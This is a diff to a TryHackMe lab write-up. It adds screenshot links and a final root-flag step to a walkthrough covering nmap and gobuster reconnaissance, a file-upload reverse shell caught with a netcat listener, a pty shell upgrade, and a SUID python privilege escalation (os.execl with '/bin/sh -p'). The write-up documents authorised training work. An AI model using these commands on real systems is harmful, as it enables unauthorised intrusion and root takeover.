@@ -6,6 +6,8 @@
 **Category:** Web Exploitation · Privilege Escalation  
 **Status:** Completed ✅
 
+![Logo](evidences/logo.png)
+
 ---
 
 ## 🎯 Objective
@@ -21,6 +23,8 @@ The goal of this lab was to perform reconnaissance, exploit a vulnerable web app
 ```bash
 nmap -sV -T4 -O -F --version-light <TARGET_IP>
 ```
+
+![NMAP SCAN](evidences/nmap_scan.png)
 
 ### Discovered services:
 
@@ -38,6 +42,8 @@ Since HTTP was open, directory brute-forcing was performed.
 ```bash
 gobuster dir -u http://<TARGET_IP> -w raft-large-directories.txt
 ```
+
+![Gobuster Scan](evidences/gobuster.png)
 
 ### Result:
 - Hidden directory discovered: /panel/
@@ -58,7 +64,11 @@ A Netcat listener was started on the attacker machine:
 ```bash
 sudo nc -nlvp 443
 ```
+![Netcat Listening](evidences/nc_443.png)
+
 After triggering the uploaded file, a reverse shell was obtained.
+
+![Netcat Connection](evidences/nc_connect.png)
 
 ---
 
@@ -68,12 +78,14 @@ The shell was upgraded using Python:
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
+![Python Shell Upgrade](evidences/python1.png)
+
 The user flag was located and retrieved:
 ```bash
 find / -type f -name user.txt 2>/dev/null
 cat /var/www/user.txt
 ```
-
+![Find user flag](evidences/find.png)
 ---
 
 ## 🚀 Step 6 — Privilege Escalation
@@ -88,8 +100,18 @@ Using **GTFOBins**, privileges were escalated:
 ```bash
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
+![Python Privilege Scalation](evidences/python2.png)
+
 Root access obtained.
 
+Reading the last flag using cat inside root folder.
+
+```bash
+cd root
+ls
+cat root.txt
+```
+![Flag final](evidences/flag.png)
 
 ---
 
@@ -114,3 +136,5 @@ Root access obtained.
 ## ⚠️ Disclaimer
 
 This lab was completed in a **controlled and legal environment (TryHackMe)** for educational purposes only.
+
+![Congrats me!](evidences/congrats.png)
